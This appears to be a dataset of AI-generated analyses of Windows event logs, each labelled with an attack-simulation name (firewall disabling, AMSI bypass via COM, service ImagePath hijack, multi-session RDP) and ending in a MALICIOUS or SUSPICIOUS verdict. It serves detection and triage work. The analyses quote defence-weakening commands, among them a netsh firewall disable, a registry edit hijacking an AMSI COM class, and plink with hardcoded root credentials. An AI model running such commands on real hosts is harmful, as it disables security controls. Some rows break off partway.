- The logs contain activity that raises questions, particularly around the file manipulations by repeated `cmd.exe` executions and utilization of `wevtutil.exe`.

Blackbit - Disable Windows Firewall using netsh firewall,"### Analysis of Logs

Based on the logs provided, several points of interest and potential indicators of compromise (IOCs) have been identified. Here’s a breakdown of the suspicious activities:

1. **Service Configuration Change (Event ID 7040):**
    - The service ""IKE and AuthIP IPsec Keying Modules"" was changed from demand start to auto start. While this alone isn't inherently malicious, it could indicate an attempt to persist or enable a service that the attacker might use later for establishing network communication.

2. **Frequent Execution of Sysinternals Tools (Sysmon Event ID 1 and 5):**
    - **whoami.exe** and **hostname.exe** are used frequently. Although common in legitimate operations, repeated or unexpected use suggests reconnaissance activities to gather system information.
    - **wevtutil.exe** is used multiple times. This tool can export and clean event logs, indicating potential log tampering or data exfiltration efforts since it is run with the command likely exporting the Sysmon logs.

3. **Suspicious Command Execution (Sysmon Event ID 1):**
    - The execution of **cmd.exe** with a command to disable the firewall: `netsh firewall set opmode mode=disable`. This is a highly suspicious and potentially malicious action as it disables the firewall, reducing host defenses against network-based attacks.

4. **Elevation of Privileges (Security Event ID 4672):**
    - A special privileges assignment to the SYSTEM user with multiple high-privilege tokens including `SeDebugPrivilege`, which is often associated with malicious activities like privilege escalation or persistent backdoor installation.

### Assessment

- **Command to Disable Firewall:** Direct evidence of malicious intent. Disabling the firewall is a typical action employed by attackers to facilitate further intrusion or lateral movement within a network.
- **Repeated Use of **whoami.exe**, **hostname.exe**, and **wevtutil.exe**:** While these may be used for legitimate administrative purposes, in combination, especially with the `netsh` command to disable the firewall, these actions suggest tool usage for reconnaissance, log manipulation, or potential information gathering.

### Threats and Risks

- **Compromise of System Security:** The host's firewall was disabled, which significantly increases its vulnerability to network attacks.
- **Privilege Escalation and Potential Persistence:** The elevated privileges assigned to the SYSTEM user coupled with changes in service start mode could indicate an attacker establishing persistence or backdoor access.
- **Log Tampering/Retrieval:** Possible attempts to export sysmon operational logs using `wevtutil.exe` may indicate efforts in log tampering or data exfiltration.

### Guidance and Resolution

**Resolution: MALICIOUS**

Immediate actions should be taken to mitigate further risk:
1. **Containment:** Isolate the affected host from the network to prevent further attacks or data exfiltration.
2. **Remediation:**

### Key Observations:

1. **Frequent Execution of System Utilities**:
   - Multiple instances of execution for `wevtutil.exe` and `conhost.exe` as seen across the Sysmon logs. These utilities are legitimate Windows components but multiple executions within a short time span could suggest script or automated task execution.
   
2. **Registry Modification**:
   - There is a specific command run via `cmd.exe` which modifies the registry key: `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer -> NoFind`. This particular key is used to disable Windows search functionality which can be a tactic used by attackers to hinder user functionality or as part of a larger attack strategy.

3. **Usage of `whoami.exe`, `hostname.exe`**:
   - These are utilities commonly used for gathering system and user information, potentially indicative of reconnaissance activity.

4. **Time Anomalies**:
   - The security logs indicate a discrepancy in system time with event ID 4616 suggesting possible unauthorized time change attempts on the system. Time discrepancies can be a red flag for logs manipulation or an attempt to obscure the true timeline of events.

### Assessment:

The combination of registry modifications, frequent execution of key system utilities, particularly those involved in system configuration and information gathering, alongside time modification attempts, indicates behavior that is not typical for normal user activity and could potentially align with malicious intent.

### Risks and Threats Identified:

- **Potential Reconnaissance**: Usage of `whoami` and `hostname` tools.
- **Registry Persistence Mechanisms**: Registry alterations aimed at manipulating user interface or system behavior.
- **Log Tampering Suspected**: Attempted manipulation of system time might indicate attempts to cover tracks or confuse analysis efforts.

InstallUtil HelpText method call,"### Analysis of Windows Event Logs

#### Overview

The provided logs consist of Windows PowerShell and Sysmon logs originating from a Windows host identified as ""Server002"". These logs are primarily related to operations attributed to PowerShell scripts and consequent process executions by the user ""SERVER002\admin_test"". Below is a detailed analysis focusing on identifying any suspicious or malicious activities.

#### Suspicious Behaviors Observed

1. **PowerShell Execution**:
   - **Script Execution**: There are multiple instances of a PowerShell script named `InstallUtilTestHarness.ps1` executed from a temporary folder (`C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\src\`). This script seems to interact with a `.dll` file (`data.004.dll`) using `InstallUtil`, an installer utility often targeted in attack techniques such as ""InstallUtil Hijacking"".
   - **Dynamic Type Creation**: The script is using `Add-Type` to create a type definition, which includes references to `System.Configuration.Install`, and is writing to a temporary file. This is unusual and could indicate that the script is being used to perform actions not typical of benign usage, such as executing code via .NET's `Add-Type` cmdlet.

2. **Process Monitoring with Sysmon**:
   - **Frequent Execution of Compilers**: Multiple executions of the C# command-line compiler (`csc.exe`) and related utilities (`cvtres.exe`) were observed. These are typically used to compile C# code into binaries. Frequent invocation from a temporary directory could imply that a malicious actor is compiling and executing custom code on the host.
   - **Usage of InstallUtil**: Execution of `InstallUtil.exe` (`C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe`) on a DLL (`data.004.dll`) observed in logs. This behavior can be harnessed for executing malicious payloads, especially if it involves temporary files.

3. **Execution of Windows Utilities**:
   - Tools like `whoami.exe`, `hostname.exe`, and `wevtutil.exe` were executed. While these tools are legitimate, their use in conjunction with the above scripts and compilers might be aimed at gaining system information or log manipulation.

#### Analysis Conclusion

The sequence of events seen in the logs represents a high possibility of malicious activity. The following factors contribute to this conclusion:

- **Unusual PowerShell Script Execution**: Importing and executing scripts from a temporary directory, especially via PowerShell and using methods not typically associated with benign administrative tasks is concerning.
- **InstallUtil and .NET Compiler Usage**: Use of `InstallUtil.exe` and continuous invocation of compilers to interact with a DLL can imply attempts of persistence or code execution associated with an attack.
- **Log Manipulation and System Reconnaissance**: Use of `wevtutil` and other reconnaissance utilities after script execution could be indicative of attempts to alter or collect information for further exploitation.

### Resolution: MALICIOUS

Given the abnormal use of PowerShell, the execution of InstallUtil, and the compiling activity detected, this activity is assessed as **MALICIOUS**. It is strongly recommended to:

- **Immediately isolate the affected system**: To prevent further potential spread or damage.
- **Conduct a thorough forensic analysis**: To understand the behavior and origin of the malicious script and any resulting impact.
- **Review and enhance existing security controls**: Strengthen monitoring and restrictions around PowerShell and InstallUtil execution on critical systems to mitigate similar risks in the future.
- **Inform relevant stakeholders**: Ensure awareness across the IT security team and management about the findings and implications.

Following these steps will help in containing the threat and preventing future occurrences."
AMSI Bypass - Override AMSI via COM,"**Detailed Analysis of the Log Entries:**

Upon reviewing the provided Sysmon, System, Application, and Security logs, certain events stand out that require closer examination for potential malicious activity:

1. **WhoAmI and Command Executions:**
   - Several instances of `whoami.exe` are executed from `C:\Windows\System32\whoami.exe` by the user `SERVER002\admin_test`. This itself is not uncommon as administrators often check the current logged-in user via `whoami`. However, it is worth noting the integrity level is high, indicating possibly elevated privileges.
   - There are entries involving `cmd.exe` using a peculiar command line: `""cmd.exe"" /c REG ADD HKCU\Software\Classes\CLSID\{fdb00e52-a214-4aa1-8fba-4357bb0072ec}\InProcServer32 /ve /t REG_SZ /d C:\IDontExist.dll /f`. This reflects an attempt to modify the registry by adding a new key with a non-existent DLL path (`C:\IDontExist.dll`), a technique typically used in persistence mechanisms or DLL hijacking attempts.

2. **Usage of `wevtutil.exe`:**
   - The `wevtutil.exe` utility is executed multiple times, which is commonly used to interact with Windows Event Logs. Frequent execution in short intervals might indicate attempts to manipulate event logs to cover tracks.

3. **Microsoft Edge Update Activities:**
   - Multiple processes related to `MicrosoftEdgeUpdate.exe` are logged, showing activities typical for software updates, like `update`, `regsvc`, `regserver`, and using Edge Update's COM registration helper. This activity seems legitimate as it originates from `NT AUTHORITY\SYSTEM`.

4. **System and Security Events:**
   - System logs reflect legitimate system time updates and service stops related to Edge updates.
   - Security logs reflecting time adjustments appear benign, showing no sign of privilege misuse or unauthorized access.

**Assessment of the Situation:**

- The `whoami.exe` invocation appears benign on the surface; however, multiple concurrent executions can be a sign of scripted or automated actions.
- The `cmd.exe` command with the registry modification instruction raises red flags for potential malicious intent, indicating possible persistence or privilege escalation attempts.
- The frequent calls to `wevtutil.exe` could suggest log manipulation activities, which requires further investigation.
- Activities linked to `MicrosoftEdgeUpdate.exe` appear legitimate and align with regular update mechanisms.

**Resolution: SUSPICIOUS**

The suspicious registry modification command involving `cmd.exe` and `reg.exe`, coupled with the frequent execution of `wevtutil.exe`, indicates the necessity for further investigation. While the Microsoft Edge Update activities appear normal, the other highlighted actions suggest that there could be underlying malicious activity intending to establish persistence or cover tracks. 

**Guidance on How to Proceed:**

1. **Immediate Actions:**
   - Isolate the machine from the network to prevent potential further spread or malicious actions.
   - Perform a thorough manual review of the registry entries shown and verify the existence or use of `C:\IDontExist.dll`.
   - Review closely the execution flow and parent-child relationships in the process execution logs for anomalies.
   - Investigate any user accounts involved (e.g., `SERVER002\admin_test`) for unusual operations or privilege levels.

2. **Additional Steps:**
   - Conduct a full malware scan to identify any malicious software that might be operating with elevated privileges or persistence mechanisms.
   - Monitor the network traffic for unusual outbound connections potentially indicating data exfiltration or communication with command and control servers.
   - Expand the monitoring and analysis to other systems to ensure no lateral movement has occurred within the network.

Conclusively, the investigation points towards suspicious activities that merit action to ensure the security of the network and the integrity of the systems involved."

- **Event ID 4624**: This event indicates a successful logon. The logon type is ""3"", which usually represents a network logon, and it's using the NTLM authentication protocol. The source IP address is ""192.168.0.102,"" which is part of a private IP address space, typically used in internal networks. The user logged in is ""admin_test,"" indicating potential administrative access.

- **Event ID 4672**: This event denotes that the user ""admin_test"" has been granted special privileges, including `SeDebugPrivilege`, which is often utilized for debugging or application development but can also be misused for privilege escalation.

- **Event ID 4634**: This event indicates a logoff for the user ""admin_test"" with logon ID ""0x8B353"". The session corresponds to a network logoff.

- **Event ID 5379**: These events involve failed credential reading operations, which can occur due to legitimate failures in reading credentials, or they might imply suspicious attempts to access credential data.

#### Sysmon Log:

- **Event ID 5**: Multiple instances of process creations were logged. The processes created include `powershell.exe`, `wevtutil.exe`, and several instances of `conhost.exe`. The presence of `powershell.exe` is notable, as PowerShell can be exploited for malicious activities, such as executing scripts that could be part of an attack.

- **Cmd.exe Execution**: There's an event showing `cmd.exe` invoked to execute a command to compile a C# source code file (`calc.cs`) using `csc.exe`. This behavior is curious and deserves scrutiny, as compiling and executing files in temp directories can signify malware operations, such as creating payloads or backdoors.

- **C# and Resource File Compiler Invocations**: Instances of `csc.exe` and `cvtres.exe` related to compilation processes are noted, particularly within the `C:\Windows\Temp\` directory. This directory is commonly used during software development and could be an indication of malicious attempt to create executables.

#### Assessing Malicious Intent:

- The combination of PowerShell execution, the use of cmd.exe to compile new executables, and the numerous credential reading failures potentially points to suspicious activity.
- The presence of strong, unusual privileges to the user ""admin_test"" such as `SeDebugPrivilege` reinforces this suspicion, as these privileges can be leveraged for further exploitation.

### Conclusion:

**Resolution: SUSPICIOUS**

Based on the evidence from the logs, particularly the use of PowerShell, the compilation of suspicious files in a temp directory, and the assignment of high-level privileges, this activity is deemed suspicious. Further investigation is warranted to ascertain the nature and intent of these actions. Steps should include:

- Conduct a forensic analysis of the compiled executables and the source C# files to identify any malicious code or backdoors.
- Review the system's network traffic to and from the IP address involved during the suspicious sessions to check for potential command and control activities.
- Implement continuous monitoring of accounts with elevated privileges and investigate any unauthorized privilege escalations."
Rundll32 with Ordinal Value,"### Analysis

The logs provided show a mixture of typical system operations and some suspicious activities. Here's a detailed breakdown of each category observed:

1. **Logon Events (Security Log):**
   - **Event ID 4624** (Successful Logon) and **4672** (Special Privileges assigned to New Logon) with high-level privileges (`SeDebugPrivilege`, etc.) are noted. These are expected for system and administrative accounts but should be verified:
     - The `System` user (NT AUTHORITY) logs on successfully, with special privileges granted.
     - The user `admin_test` also logs in successfully from a remote IP (`192.168.0.102`) using `NTLM` authentication with high privileges. The repeated granting of high privileges to this user raises suspicion.

2. **Process Execution Events (Sysmon Log):**
   - Several executions of system processes such as `powershell.exe`, `conhost.exe`, and `rundll32.exe` are logged under the user `admin_test`.
   - The **use of `rundll32.exe` to execute a DLL** (`AllTheThingsx64.dll`) from a `Temp` directory is particularly suspicious and indicative of potential malicious activity. This is a common method used for malicious execution, especially considering it’s executed through a command shell (`cmd.exe`).
   - Seeming misuse of system utilities like `wevtutil.exe` multiple times, which can be used to manage event logs, could indicate attempts to modify or clear logs.

3. **Edge Update Activity:**
   - There is extensive and detailed log activity related to Microsoft Edge updates. These events appear benign as they follow a legitimate pattern for system updates (`MicrosoftEdge_X64`), including installer setups with Microsoft Corporation's signature. 
   - However, it's crucial to confirm these actions’ legitimacy, especially if triggered unexpectedly outside regular system update schedules.

4. **Job Schedules and System Services:**
   - Execution of usual system utilities like `SearchProtocolHost.exe`, `SearchFilterHost.exe` by the NT AUTHORITY\\SYSTEM is normal operation but should be cross-referenced with time of device use.

### Assessment

- **Suspicious Logins and Privilege Escalation:**
  - The repeated high-privilege assignments to `admin_test` and remote login from an unverified IP (not ensuring legitimate access) suggest **Suspicious activity**.

- **DLL Execution via `rundll32.exe`:**
  - This indicates potential malicious behavior. The path (`Temp` directory) and method of execution through `cmd.exe` strengthen the need for further examination of `AllTheThingsx64.dll`.

### Conclusions and Recommendations

- **Resolution: SUSPICIOUS**
  - The logs contain several indicators that merit further investigation due to potential breach activity. Several high-privilege executions for the `admin_test` user and unusual `rundll32.exe` execution specifically appear suspicious.

- **Next Steps:**
  1. **Verify the `admin_test` user activities** - Confirm the legitimacy of these actions through user interviews and assess access records.
  2. **Investigate the remote IP** (`192.168.0.102`) that `admin_test` used to log in. Determine if this IP is within a trusted range.
  3. **Analyze `AllTheThingsx64.dll`** - Check its origins, whether it’s a known legitimate file or malware.
  4. **Check for persistence mechanisms** often used with malicious DLL execution and review recent changes to scheduled tasks or startup items.
  5. **Enhance monitoring** for `rundll32.exe` and other frequent locations for unauthorized DLL loading.
  6. **Consult with IT** to ensure Microsoft Edge update activities are in line with standard update schedules."
ESXi - Change VIB acceptance level to CommunitySupported via ESXCLI,"Upon analyzing the provided Windows event logs, I have identified potential indicators of malicious activity based on the following observations:

1. **Suspicious Usage of Command-Line Tools**:
    - **PowerShell and `wevtutil.exe` Usage**:
      There are multiple instances of `powershell.exe` and `wevtutil.exe` executed in quick succession. Usage of `wevtutil.exe` often relates to managing event logs and can be used for log clearing by an attacker.
    - **Execution of `plink.exe`**:
      The logs show execution of `plink.exe`, a command-line tool from the PuTTY suite for SSH connections, with credentials `-l ""root"" -pw ""pass""`. The use of hardcoded passwords alongside tools like `plink` in non-standard directories (`C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\Externalfiles`) is highly suspicious and indicative of unauthorized access or data exfiltration attempts.

2. **Anomalous Child Processes**:
    - The execution of well-known Windows binaries like `conhost.exe`, `cmd.exe`, and `whoami.exe` is expected; however, the context in which they are executed (e.g., parent-child relationships and directories) raises suspicion, especially following `pscmd.exe` and other tools.

3. **Administrative Privileges**:
    - The security logs record the privileges associated with SYSTEM and NT AUTHORITY, including `SeDebugPrivilege` and `SeImpersonatePrivilege`, which could allow an attacker to perform unauthorized actions if compromised.

4. **Unusual Logon and Credential Access Events**:
    - Events like `EventID 4624` repeated for SYSTEM and SERVICE accounts indicate background/system level activities. While normal on a server, excessive repetition should be reviewed for anomalies.
    - `EventID 5379`: Multiple failed credential access events and attempts to access Microsoft accounts using `WindowsLive` tokens suggest attempted unauthorized access or reconnaissance activity.

5. **Potential Misuse of SYSTEM Processes**:
    - Legitimate SYSTEM processes (`svchost.exe`, `sppsvc.exe`, `TrustedInstaller.exe`, etc.) alongside unusual usage, particularly when executed outside of routine patch management or updates, should be scrutinized.

**Assessment and Resolution**:
Based on the analysis of these logs, the activities, particularly the usage of `plink.exe` with embedded credentials, the execution of `wevtutil.exe`, and suspicious command-line invocations, suggest potential unauthorized or malicious behavior.

**Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
- **Immediate Action**: Disconnect the affected system from the network to prevent further exfiltration or lateral movement.
- **Forensic Analysis**: Obtain a memory and disk image for more detailed forensic analysis.

- **Conduct IOC Sweeps**: Search other systems for similar indicators or actions, such as the use of `plink.exe` in anomalous directories.
- **Containment and Eradication**: Remove any malicious binaries, reset credentials and permissions, and apply necessary system and security patches.
- **Post-Incident Monitoring**: Implement enhanced logging and monitoring for any signs of ongoing compromise.
- **Security Patch and Policy Review**: Ensure all security measures are up to date and review security policies for gaps."
Service ImagePath Change with reg.exe,"After analyzing the provided Windows event logs, several points of interest and potential indicators of suspicious or malicious activity arise:

1. **Command Execution Monitoring:**
   - There is an execution of `cmd.exe` with a command to add a registry key `HKLM\SYSTEM\CurrentControlSet\Services\calcservice` with an image path directed to `cmd.exe`. This activity is suspicious because:
     - Creating or modifying service registry entries is often a technique used by malware to achieve persistence on a system.
     - Using `cmd.exe` as an image path for a service is unusual and can lead to arbitrary command execution under the context of a service.

2. **Suspicious Process Activity:**
   - A series of processes being executed almost simultaneously by the user `SERVER002\admin_test`, including `powershell.exe`, `wevtutil.exe`, `conhost.exe`, and `cmd.exe` possibly involved in the activity:
     - Usage of `powershell.exe` could be legitimate for administrative tasks but can be abused by attackers for script execution or downloading additional payloads.
     - `wevtutil.exe` is typically used for querying or clearing event logs, which could suggest an attempt to cover tracks.

3. **Host Discovery Tools:**
   - Execution of utilities such as `whoami.exe` and `hostname.exe` shows potential host discovery activity, which could be part of a legitimate administrative task or reconnaissance by an attacker.

4. **High Integrity Level Processes:**
   - Many of the activities and processes are executed with a high integrity level, signifying elevated privileges. This state could be exploited if the account being used is compromised.

5. **Patterns and Anomalies:**
   - The series of events is executed within a brief window (~15 seconds), indicating a script or automated task rather than manual human execution.

**Assessment and Resolution:**

- The creation of a service pointing to `cmd.exe` through registry modification and execution pattern of auxiliary processes like `wevtutil.exe` suggest potentially malicious intentions.
- While there's no definitive sign of malware payloads or exploit usage in the logs, the operations carried out, specifically the service modification, suggest preparatory actions consistent with the establishment of persistence.

Given the observed anomalies, I categorize this situation as **SUSPICIOUS**. The activities warrant further investigation, including:

- Verification of recent changes to registry keys related to services.
- Checking for other signs of system compromise or unauthorized access.
- Monitoring network traffic and investigating the use of `powershell.exe`.
- Ensuring that the user account `SERVER002\admin_test` is secure and has not been compromised.

It is recommended to perform a deeper forensic analysis on the host and potentially engage with incident response based on additional findings."
Microsoft.Workflow.Compiler.exe Payload Execution,"The log analysis reveals a mix of benign and potentially suspicious activities. Here’s a detailed breakdown of the events:

### Benign Activity:
1. **Microsoft Edge Update Activities**: 
   - Numerous logs show activity related to Microsoft Edge Update, such as executions of `MicrosoftEdgeUpdate.exe`. These events, which include checks and updates, are typical system maintenance tasks and are usually benign.

2. **System Component Execution**:
   - Execution of standard Windows processes like `svchost.exe`, `sppsvc.exe`, and `TiWorker.exe` which are associated with normal system operations.

3. **Normal Logon Activity**:
   - Logon events using the `SYSTEM` account and the granting of high-privilege tokens (`SeDebugPrivilege`, `SeBackupPrivilege`, etc.) are typically expected for system-level operations.
   
4. **Failed Credential Operations**:
   - The `5379` events indicate failed attempts to read certain credentials. The `ReturnCode` of `3221225567` often signifies access issues or lack of necessary credentials, rather than outright malicious behavior. These can occur in normal system or application operations.

### Potentially Suspicious Activity:
1. **PowerShell Execution**:
   - The execution of PowerShell with the command `microsoft.workflow.compiler.exe` raises some concerns. This behavior could potentially indicate an attempt to exploit a vulnerability if this specific process and context are aberrant for the environment.

2. **Unhandled .NET Runtime Exception**:
   - The `microsoft.workflow.compiler.exe` application crashed due to a `System.IO.DirectoryNotFoundException`, indicating an issue with trying to access a directory or file that doesn't exist. This could hint at programming errors, misconfiguration, or manipulation attempts.

3. **Frequent Usage of `wevtutil.exe`**:
   - Multiple instances of `wevtutil.exe` being executed could suggest someone tampering or querying event logs, potentially trying to hide tracks or conduct forensic analysis.

4. **WerFault.exe Execution**:
   - This program is Windows Error Reporting, and continual invocation following the `microsoft.workflow.compiler.exe` application errors might suggest an underlying issue needing closer examination.

### Assessment:
- Most activities surrounding Microsoft Edge updates and system processes appear benign, expected for regular system management.
- The PowerShell command execution and repeated event log utility calls could suggest a layer of suspicious activity that warrants further investigation, especially in the context of who initiated these actions and if they're typical based on historical activity in the environment.
- The workflow compiler execution issue might not directly indicate malicious behavior without additional context but merits attention due to the potential for misuse.

### Resolution:
**SUSPICIOUS**

### Recommended Actions:
1. **Investigate the PowerShell Activity**: Check historical logs to see if similar PowerShell commands have been run legitimately in the past and by whom.
2. **Review Process Initiators**: Determine who triggered the processes such as `conhost.exe` and `powershell.exe` directly associated with the `admin_test` user.
3. **Check for Misconfiguration or Programming Errors**: Assess whether the .NET application crash is due to legitimate software malfunction or indicative of malicious intent.
4. **Monitor Wevtutil Usage**: Ensure that the frequent use of `wevtutil.exe` is accounted for and not indicative of log tampering.

Given these measures, if no legitimate reason surfaces for the suspicious activities, escalate with appropriate IT and cybersecurity personnel for a closer examination and potentially implement stricter monitoring controls."
Activities To Disable Secondary Authentication Detected By Modified Registry Value,"After analyzing the provided log entries, here is a detailed assessment of the situation:

### Analysis:

1. **Application Log:**
   - The ""edgeupdate"" service is mentioned with events indicating it was stopped, which may suggest normal software update behavior, but requires context.
   - The ""Microsoft-Windows-Security-SPP"" event is related to software licensing, which appears benign.

2. **System Log:**
   - Time change events indicate the system time was adjusted. Such events can be legitimate but can also be used to deceive forensics or logging tools. Their presence should be corroborated with other suspicious activity.

3. **Sysmon Log:**
   - Multiple instances of `wevtutil.exe` and `conhost.exe` run by `SERVER002\admin_test` are observed in close succession. `wevtutil.exe` is a legitimate tool for managing Windows event logs and could be used for cleanup or data exfiltration in the context of malicious actions.
   - Execution of tools like `HOSTNAME.EXE`, `whoami.exe`, and several instances of `cmd.exe` with command-line arguments to edit the registry is notable. The command to modify the registry setting for ""AllowSecondaryAuthenticationDevice"" is suspicious as it can be part of security bypass techniques.
   - There's a sequence of events concerning `MicrosoftEdgeUpdate.exe`, indicating legitimate Edge update activities executed under `NT AUTHORITY\SYSTEM`, which seems benign in isolation but should be confirmed with policies and schedules.

4. **Security Log:**
   - Event ID 4624 shows a successful logon event with NTLM authentication from IP `192.168.0.102` for user `admin_test`, which could be legitimate admin access but warrants verification for unusual access patterns.
   - Event ID 4672 indicates special privileges granted to `admin_test`, showing more power than usual. This needs validation against normal privileges for this user.
   - Event ID 4634 and ID 4616 show standard logoff and time change events, respectively, but they should be contextualized to check if they align with routine maintenance or admin activity.

### Assessment:

The logs indicate potentially suspicious activities such as the use of `cmd.exe` for registry edits and unusual administrative privilege usage. The use of legitimate tools (`wevtutil.exe`, `whoami.exe`) doesn't immediately suggest malicious activity but could indicate misuse in conjunction with other suspicious behavior.

The presence of time changes and specific command executions should be investigated further, specifically correlating these events with user behavior, scheduled tasks, or a known benign cause. The preference is to validate if these activities align with the operations expected from user `admin_test` and the machine in question.

### Resolution:

**SUSPICIOUS** - The logs exhibit activities that don't look completely benign and need more investigation, especially focusing on the unusual privilege escalation behavior and registry changes. Further steps should include verifying the legitimacy of these actions with the involved users, reviewing access logs for anomalies, and ensuring that company policies for software updates and privilege assignments are properly enforced."

Mimic Ransomware - Allow Multiple RDP Sessions per User,"## Analysis of Windows Event Logs

### Overview:
The provided Windows event logs cover several process executions and security-related activities. The goal is to identify any indicators of malicious activity or compromise.

### Key Observations:
1. **Repeated Execution of `wevtutil.exe`:**
   - `wevtutil.exe` is used for managing event logs. Frequent execution within a short timeframe without clear administrative context could indicate log clearing or manipulation attempts.

2. **Registry Modification via `cmd.exe`:**
   - Command executed: `""cmd.exe"" /c reg add ""HKLM\\System\\CurrentControlSet\\Control\\Terminal Server"" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f`
   - This modifies Terminal Server settings to allow multiple sessions per user, which can be used to maintain persistent RDP connections—typical of techniques to evade user session locks.

3. **High Integrity Level Execution:**
   - Several processes (like `cmd.exe`, `reg.exe`, and `conhost.exe`) run with ""High"" integrity level, indicating administrative privileges. Combined with the registry change, this patterns suggest potential misuse of admin rights or privilege escalation.

4. **Time Manipulation:**
   - Security logs indicate a change in system time, which may be an attempt to circumvent time-based security alerts or auditing controls.

5. **Logons and Privilege Elevation:**
   - The `admin_test` account logged in using NTLM (Legacy) authentication and possessed several powerful privileges (`SeDebugPrivilege`, among others), which are often used in lateral movement or privilege escalation attacks.

6. **Presence of `wsmprovhost.exe`:**
   - `wsmprovhost.exe` is part of Windows Remote Management (WinRM). Its frequent invocation might indicate remote command execution, potentially used in lateral movement.

### Assessment:
- The combination of registry settings modification, repeated execution of system utilities like `wevtutil.exe`, time manipulation, and significant use of elevated privileges is anomalous and suggests potential malicious activity. 
- The behaviors observed align with tactics and techniques used in lateral movement and persistence mechanisms.

### Threats/Risks:
- Unintended modifications to system configurations that enable multiple concurrent RDP sessions.
- Potential evasion of security and logging mechanisms through time manipulation and log management.
- High privileges being potentially exploited for unauthorized system changes and data access.

### Guidance:

CheckIfInstallable method call,"### Detailed Analysis

Upon examining the provided logs, we can identify several notable activities that could potentially indicate malicious behavior:

1. **PowerShell Activity**: There are events where PowerShell is being used to execute a script `InstallUtilTestHarness.ps1`, which involves a suspicious process chain starting with `powershell.exe`. This process attempts to execute functions from a potentially malicious DLL (`data.004.dll`) stored in a temporary directory. The command-line used for PowerShell is notably complex and indicative of potentially suspicious behavior, as it involves dynamically loading and executing code.

2. **.NET Compiler Activity**: The presence of commands involving `csc.exe` (C# compiler) and `cvtres.exe` (Microsoft® Resource File To COFF Object Conversion Utility) coupled with PowerShell activity indicates the compilation of code on the fly, which is often a red flag for potential malicious activity. Such activities are common in scenarios where attackers wish to execute arbitrary code without leaving significant footprints on the disk.

3. **Wevtutil and Conhost Execution**: Repeated usage of `wevtutil.exe` and `conhost.exe` within a short period of time can be suspicious. `wevtutil` is a command-line utility used for managing Windows event logs and could potentially be used maliciously to clear logs to cover tracks.

4. **Unusual DLL and Temp Directory Paths**: The activity includes suspicious paths, such as `C:\Users\ADMIN_~1\AppData\Local\Temp\file\data.004\src\InstallUtilTestHarness.ps1` and frequent execution of scripts and binaries from temporary directories, which is a known tactic to manipulate security solutions and avoid detection.

5. **User and Integrity Level**: Most activities are executed by the user ""SERVER002\admin_test"" with high integrity levels, implying administrative privileges are being utilized, which increases the damage an attacker can inflict if the system is compromised.

6. **Edge Update Entries**: There are multiple entries related to legitimate Microsoft Edge Update processes, often executed by `NT AUTHORITY\SYSTEM`. While these seem legitimate at a glance, they are interspersed with potentially malicious activities, making us consider the scenario where legitimate processes are being used or mimicked to obscure malicious actions.

### Assessment and Recommendation

Based on the analysis of these logs, there are significant signs suggesting the possibility of compromise, mainly due to:
- The use of PowerShell scripts from temporary directories executing complex commands.
- Concurrent compilation and execution of code dynamically, which is a characteristic of more sophisticated attacks.
- Potential misuse of system tools and privileges indicative of stealth tactics.

**Resolution: MALICIOUS**

### Guidance on How to Proceed

1. **Immediate Containment**: Isolate the affected system (Server002) from the network to prevent further propagation of potential threats.
  
2. **In-depth Review**: Conduct a full forensic investigation on the system to identify the scope, source, and timeline of the breach.

3. **Review Admin Accounts**: Investigate the activities performed under the ""SERVER002\admin_test"" account and reset its credentials immediately.

4. **Patch Known Vulnerabilities**: Ensure all systems are updated with the latest security patches, especially for components like PowerShell and .NET.

5. **Audit and Clean Temporary Files**: Investigate and remove residual temporary files and any spawned executables or DLLs.

6. **Strengthen Monitoring**: Enhance monitoring of PowerShell activities and .NET framework processes across the network.

7. **User Training**: Educate employees about phishing attacks and suspicious file activities, emphasizing the vigilance needed in managing files and scripts from unknown sources."
Allow SMB and RDP on Microsoft Defender Firewall,"### Detailed Analysis of the Logs

Upon examining the provided Windows event logs, there are several points of interest:

1. **Multiple Executions of Administrative Tools:** 
   - The logs indicate multiple instances of `wevtutil.exe` and `conhost.exe` running under the user `SERVER002\\admin_test`. These processes are capable of modifying event logs and host interactive command-line sessions. Frequent executions of `wevtutil.exe` in such a short span could indicate attempts to clear event logs or query logs, which might be suspicious if conducted without clear administrative reasons.

2. **Elevation to System Integrity Level:** 
   - The `cmd.exe` process was executed with the command line argument to enable Remote Desktop and file and printer sharing (i.e., altering firewall rules). This is coupled with the context of `wevtutil.exe` usage, suggesting potential unauthorized system changes.

3. **Usage of `whoami.exe`:** 
   - The presence of `whoami.exe` could indicate an attempt to verify identity or permissions on the system, which could be benign but may also indicate reconnaissance activity by an unauthorized user.

4. **EdgeUpdate Activity:**
   - The logs show a significant number of subprocesses related to `MicrosoftEdgeUpdate.exe`. While updates are typical, the presence of unusual command arguments and related processes could suggest ongoing legitimate update activities, but they are worth a second look to confirm they align with expected software maintenance tasks.

5. **Firewall Modifications:**
   - The execution of commands to enable Remote Desktop and file and printer sharing pose a potential security risk if not executed as part of a legitimate administrative task, especially if these features were disabled for security reasons.

### Assessment of the Situation

- **Suspicious Activity Detected:**
  - The use of `wevtutil.exe` and `cmd.exe` for modifying firewall rules, especially in quick succession and from the same user account, suggests potentially unauthorized activities.
  - The dominant integrity level during these operations is ""High,"" meaning the user had significant privileges.
  
- **Additional Context Required:**
  - Cross-reference these logs with authentication logs to confirm if `SERVER002\\admin_test` activity aligns with expected administrative actions.
  - Review corporate policy on Remote Desktop and file sharing settings to determine if these actions are associated with scheduled maintenance or anomaly.

### Resolution and Recommendations

**Resolution: SUSPICIOUS**  
The activity noted in the logs doesn't appear to be friendly strictly, and the context around privilege usage and command execution suggests an elevated risk level. However, the lack of direct malicious indicators (like malware execution) means further investigation is warranted.

**Guidance:**
1. **Verify Intent:** Check with the network/security teams or administrators involved to ascertain whether these actions were part of scheduled tasks or maintenance.
2. **Account Review:** Conduct a thorough audit of the `SERVER002\\admin_test` account to verify if it is secure and hasn't been compromised.
3. **Log Reconciliation:** Compare these logs against user login events and real-time alerts to identify any unauthorized access patterns.
4. **System Security Review:** Ensure firewall changes align with corporate security standards and immediately lock down any unauthorized changes.
5. **Security Monitoring:** Enhance EDR settings to monitor similar command executions to detect or prevent potential unauthorized system changes. 

This approach should help clarify the intent of the detected activities and mitigate any immediate risks."
